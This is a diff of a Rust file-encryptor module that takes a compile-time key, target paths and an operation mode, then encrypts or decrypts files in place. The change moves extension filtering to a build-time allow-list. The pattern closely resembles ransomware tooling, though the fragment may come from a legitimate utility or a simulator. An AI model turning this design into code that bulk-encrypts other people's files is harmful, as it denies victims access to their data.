@@ -10,18 +10,19 @@ use crate::decrypt::decrypt_file_in_place;
 use crate::encrypt::encrypt_file_in_place;
 use crate::models::{IGNORE_EXTENSIONS, TARGET_EXTENSIONS};
 
-pub fn get_embedded_config() -> Result<(String, Vec<String>, String, bool), RError> {
-	let key : &'static str                  = env!("ENCRYPTION_KEY")        ;
-	let paths_str : &'static str            = env!("TARGET_PATHS")          ;
-	let mode : &'static str                 = env!("OPERATION_MODE")        ;
-	let filter_only_target : &'static str   = env!("FILTER_ONLY_TARGET")    ;
+pub fn get_embedded_config() -> Result<(String, Vec<String>, String, Vec<String>,), RError> {
+	let key : &'static str                      = env!("ENCRYPTION_KEY")        ;
+	let paths_str : &'static str                = env!("TARGET_PATHS")          ;
+	let mode : &'static str                     = env!("OPERATION_MODE")        ;
+	let allowed_extensions_str : &'static str   = env!("ALLOWED_EXTENSIONS")    ;
 
 	let paths: Vec<String> = paths_str.to_string().split('|').map(|s : &str| s.to_string()).collect();
+	let allowed_extensions: Vec<String> = allowed_extensions_str.to_string().split('|').map(|s : &str| s.to_string()).collect();
 
-	Ok((key.to_string(), paths, mode.to_string(), filter_only_target == "true"))
+	Ok((key.to_string(), paths, mode.to_string(), allowed_extensions))
 }
 
-pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, encrypt_only_target: bool) -> Result<(usize, usize), String> {
+pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, allowed_extensions: Vec<String>) -> Result<(usize, usize), String> {
 	let path = Path::new(path_str);
 
 	if !path.exists() { return Err(format!("Path does not exist: {}", path_str)); }
@@ -31,7 +32,7 @@ pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, encrypt_only_tar
 	let mut skipped = 0;
 
 	if path.is_file() {
-		if mode == "encrypt" && !should_encrypt_file(path) {
+		if mode == "encrypt" && !should_encrypt_file(path, allowed_extensions.clone()) {
 			println!("   ⏭️  Skipped: {} (ignored extension)", path.display());
 			return Ok((0, 0));
 		}
@@ -52,8 +53,8 @@ pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, encrypt_only_tar
 				if name == "encryptor.exe" { continue; }
 			}
 
-			if mode == "encrypt" && encrypt_only_target {
-				if !should_encrypt_file(entry_path) {
+			if mode == "encrypt" {
+				if !should_encrypt_file(entry_path, allowed_extensions.clone()) {
 					skipped += 1;
 					continue;
 				}
@@ -73,17 +74,15 @@ pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, encrypt_only_tar
 	Ok((processed, errors))
 }
 
-fn should_encrypt_file(path: &Path) -> bool {
+fn should_encrypt_file(path: &Path, allowed_extension: Vec<String>) -> bool {
 	let extension = path.extension().and_then(|ext| ext.to_str()).map(|ext| ext.to_lowercase());
 
 	match extension {
 		Some(ext) => {
-			if IGNORE_EXTENSIONS.contains(&ext.as_str()) { return false; }
-			if TARGET_EXTENSIONS.contains(&ext.as_str()) { return true; }
-			true
+			allowed_extension.contains(&ext.to_string())
 		}
-		None => {
-			true
+		_ => {
+			false
 		}
 	}
 }
